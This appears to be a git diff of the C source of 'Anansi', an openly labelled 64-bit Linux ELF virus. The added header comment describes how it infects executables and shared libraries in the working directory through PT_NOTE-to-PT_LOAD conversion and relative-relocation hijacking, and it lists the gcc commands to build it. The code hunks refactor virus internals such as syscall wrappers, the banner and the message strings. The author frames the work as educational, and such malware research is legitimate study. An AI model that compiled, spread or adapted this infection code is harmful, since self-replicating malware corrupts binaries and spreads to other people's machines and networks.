@@ -1,3 +1,28 @@
+/* WARNING #1: This is a virus, it can infect files on your computer, it can potentially spread across your network.
+ * WARNING #2: I assume zero responsibility/liability in how you decide to use this, virus engineering is exciting and insightful, malicious data destruction isn't.
+ * Many things can be learned from writing viruses (knowledge of binary formats, software armoring techniques [packing, obfuscation, etc], reverse engineering and AV/Detection technology),
+ * it is to those ends I embarked on something that would seem useless/counter-productive to some, I assume the reader/user will share my sentiment.
+ *
+ * ABOUT: Anansi is a 64-bit ELF virus that targets the current working directory.
+ * ELF binaries that are of type ET_EXEC and ET_DYN are targeted, including libraries.
+ * (First of its kind as far as I know, I have yet to see a virus abuse this specific kind of relocation or target both executables and libs on Linux).
+ * Performs standard PT_NOTE to PT_LOAD infection algorithm coupled to Relative Relocation Hijacking / Poisoning.
+ * In the event relocation type R_X86_64_RELATIVE isn't available, the virus will default to entry point modification.
+ * This is a VERY powerful virus, any executables dynamically linked to an infected library will have the virus executed in its address space or any libraries having them as dependencies.
+ * Compile (MINIMUM REQUIREMENT): gcc anansi.c -o anansi -nostdlib -fno-stack-protector -O0
+ * Compile (WITH DEBUGGING): gcc anansi.c -o anansi -nostdlib -fno-stack-protector -O0 -ggdb3 -D DEBUG
+ * Compile (MAX_TARGET CONTROL): gcc anansi.c -o anansi -nostdlib -fno-stack-protector -O0 -ggdb3 -D MAX_TARGET=10
+ *
+ * MAX_TARGET will compile the virus to search for a maximum amount of infection targets per an instance of execution, by default it searches for three.
+ * Self and nested infection have mitigations in place to prevent occurrences, Anansi will perform heuristic detection to identify already infected targets (no magic bytes necessary).
+ *
+ * Additional Note: libc and ld-linux are on the menu, not for relative relocation poisoning (I believe libc and ld-linux do not use RELATIVE RELOCATIONs), but as executables.
+ * Email: sad0p@protonmail.com
+ * Github: github.com/sad0p
+ * Twitter: sad0pR
+ * Blog: sad0p-re.org
+ */
+
 #include<unistd.h>
 #include<sys/stat.h>
 #include<sys/mman.h>
@@ -5,8 +30,11 @@
 #include<fcntl.h>
 #include<stdint.h>
 #include<stdbool.h>
-#include<stdarg.h>
 #include<elf.h>
+
+#ifdef DEBUG
+	#include<stdarg.h>
+#endif
 
 /* process_elf flags */
 #define PROCESS_ELF_EHDR 0x00000001
@@ -37,7 +65,6 @@
 //misc macros
 #define RDRAND_BIT (1 << 30)
 #define EPILOG_SIZE 30
-#define ANANSI_WORKS_MSG_LEN 13
 #define XOR_KEY 0x890c6d01
 
 typedef struct elfbin {
@@ -89,7 +116,7 @@ void process_elf_initialize(Elfbin *target, char *full_path);
 int process_elf(Elfbin *target, int attr, int perm, uint64_t len);
 void process_elf_free(Elfbin *target);
 bool valid_target(Elfbin *target, int min_size, bool no_shared_objects);
-void print_banner_test();
+void anansi_banner();
 
 
 #ifdef DEBUG
@@ -113,16 +140,14 @@ long anansi_read(int fd, void *buf, size_t count);
 void *anansi_mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
 long anansi_stat(const char *path, struct stat *statbuf);
 long anansi_munmap(void *addr, size_t len);
-long anansi_readlink(const char *path, char *buf, size_t bufsiz);
+long anansi_readlink(const char *path, const char *buf, size_t bufsiz);
 long anansi_open(const char *pathname, int flags, int mode);
 long anansi_unlink(const char *pathname);
 long anansi_getdents64(int fd, void *dirp, size_t count);
-long anansi_getcwd(char *buf, size_t size);
+long anansi_getcwd(const char *buf, size_t size);
 long anansi_close(int fd);
 
 //anansi libc-like function implementation prototypes
-
-
 void *anansi_memset(void *s, int c, size_t n);
 size_t anansi_strlen(const char *s);
 void *anansi_malloc(size_t len);
@@ -196,14 +221,8 @@ void vx_main()
 	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
 	uint8_t *vx_start = (uint8_t *)get_rip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
 
-
-	char anansi_msg[ANANSI_WORKS_MSG_LEN];
-	char encrypted_anansi_msg[] = "`o`orh,vnsjr";
-
-	decrypt_xor(encrypted_anansi_msg, anansi_msg);
-	anansi_write(STDOUT_FILENO, anansi_msg, ANANSI_WORKS_MSG_LEN);
-	anansi_write(STDOUT_FILENO, "\n", 1);
-
+	char anansi_msg[] = "anansi-works\n";
+	anansi_write(STDOUT_FILENO, anansi_msg, anansi_strlen(anansi_msg));
 
 #ifdef DEBUG
 	anansi_printf("vx_start @ %lx\n", vx_start);
@@ -225,9 +244,7 @@ void vx_main()
 	nread = anansi_getdents64(cwd_fd, cwd_listings, DIR_LISTING_SIZE);
 	attr = PROCESS_ELF_EHDR | PROCESS_ELF_PHDR | PROCESS_ELF_SHDR;
 
-	target.vx_size = vx_size;
-	target.vx_start = vx_start;
-	print_banner_test();
+	anansi_banner();
 	self_path = get_self_path();
 
 	for(long entry = 0; entry < nread; entry += d->d_reclen) {
@@ -524,7 +541,7 @@ bool within_section(Elfbin *target, char *section, uint64_t addr)
 
 	for(int i = 0; i < target->ehdr->e_shnum; i++) {
 		unsigned char *indexed_section = (unsigned char *)(&strtab[target->shdr[i].sh_name]);
-		size_t indexed_section_len = anansi_strlen(indexed_section);
+		size_t indexed_section_len = anansi_strlen((const char *)indexed_section);
 		if((*indexed_section == '\0') || (section_len != indexed_section_len)) //handling edge-cases
 			continue;
 
@@ -1005,7 +1022,13 @@ char *itoa_final(long n, int base, char *output) {
 
 #endif
 
-void print_banner_test()
+/* Get pass the stack string limit in GCC.
+ * Breaking the string up to individual vars keeps the strings on the stack.
+ * Strings placed in .data or .rodata are out of reach in this virus design.
+ * Code below was accomplished with a super-quick python script (tldr; don't write by hand).
+ */
+
+void anansi_banner()
 {
 	char banner_0[] = "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3a\x20";
 	anansi_write(STDOUT_FILENO, banner_0, anansi_strlen(banner_0));
@@ -1394,13 +1417,13 @@ __exit_syscall(int, anansi_exit, status, int);
 __write_syscall(long, anansi_write, fd, int, buf, const void *, count, size_t);
 __read_syscall(long, anansi_read, fd, int, buf, void *, count, size_t);
 __mmap_syscall(void *, anansi_mmap, addr, void *, len, size_t, prot, int, flags, int, fildes, int, off, off_t);
-__readlink_syscall(long, anansi_readlink, pathname, const char *restrict, buf, char *restrict, bufsiz, size_t);
+__readlink_syscall(long, anansi_readlink, pathname, const char *restrict, buf, const char *restrict, bufsiz, size_t);
 __stat_syscall(long, anansi_stat, path, const char *, statbuf, struct stat *);
 __munmap_syscall(long, anansi_munmap, addr, void *, len, size_t);
 __open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int);
 __unlink_syscall(long, anansi_unlink, pathname, const char *);
 __getdents64_syscall(long, anansi_getdents64, fd, int, dirp, void *, count, size_t);
-__getcwd_syscall(long, anansi_getcwd, buf, char *, size, size_t);
+__getcwd_syscall(long, anansi_getcwd, buf, const char *, size, size_t);
 __close_syscall(long, anansi_close, fd, int);
 
 /*
